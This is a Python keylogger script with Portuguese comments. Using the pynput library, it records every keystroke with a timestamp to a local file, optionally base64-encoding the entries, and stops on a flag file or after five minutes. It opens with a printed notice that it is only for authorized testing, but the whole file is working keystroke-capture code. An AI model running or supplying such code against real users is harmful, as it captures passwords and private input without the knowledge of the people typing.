import pynput.keyboard
import threading
import base64
import datetime
import os
import time

# Configurações
LOG_FILE = "keylog.txt"
STOP_FILE = "stop.flag"
ENCODING = "base64"  # 'none' para desabilitar
TIMEOUT = 300  # Tempo limite em segundos (5 minutos)

# Aviso Legal
def legal_warning():
    print("="*60)
    print("  USO ÉTICO APENAS – CONSENTIMENTO REQUERIDO")
    print("  Este software destina-se exclusivamente a testes autorizados.")
    print("  Não continue sem autorização explícita da organização-alvo.")
    print("="*60)
    input("Pressione Enter para continuar...")

# Codificação opcional
def encode_data(data):
    if ENCODING == "base64":
        return base64.b64encode(data.encode()).decode()
    return data

# Função para registrar a tecla pressionada
def on_press(key):
    try:
        key_data = str(key.char)
    except AttributeError:
        key_data = f"[{key}]"

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"{timestamp} - {key_data}\n"
    log_entry = encode_data(log_entry)

    with open(LOG_FILE, "a") as f:
        f.write(log_entry)

# Monitoramento do arquivo de parada
def stop_check(listener):
    while True:
        if os.path.exists(STOP_FILE):
            print("Arquivo de parada detectado. Encerrando keylogger.")
            listener.stop()
            break
        time.sleep(1)

# Timer de autoencerramento
def auto_stop(listener, timeout):
    time.sleep(timeout)
    print("Tempo limite alcançado. Encerrando keylogger.")
    listener.stop()

# Execução principal
def main():
    legal_warning()

    print("Iniciando keylogger... pressione Ctrl+C para sair manualmente.")

    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()

    # Threads paralelas
    threading.Thread(target=stop_check, args=(listener,), daemon=True).start()
    threading.Thread(target=auto_stop, args=(listener, TIMEOUT), daemon=True).start()

    listener.join()
    print("Keylogger finalizado.")

if __name__ == "__main__":
    main()
